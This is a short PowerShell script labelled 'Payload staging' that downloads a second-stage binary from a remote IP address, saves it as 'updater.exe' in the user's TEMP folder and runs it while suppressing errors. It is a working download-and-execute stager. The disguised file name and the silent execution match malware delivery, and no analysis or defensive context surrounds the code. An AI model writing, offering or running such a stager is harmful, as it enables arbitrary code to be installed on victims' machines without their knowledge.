<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://203.0.113.93/cdn/stage2.bin',
    [string]$LocalPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath)
Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
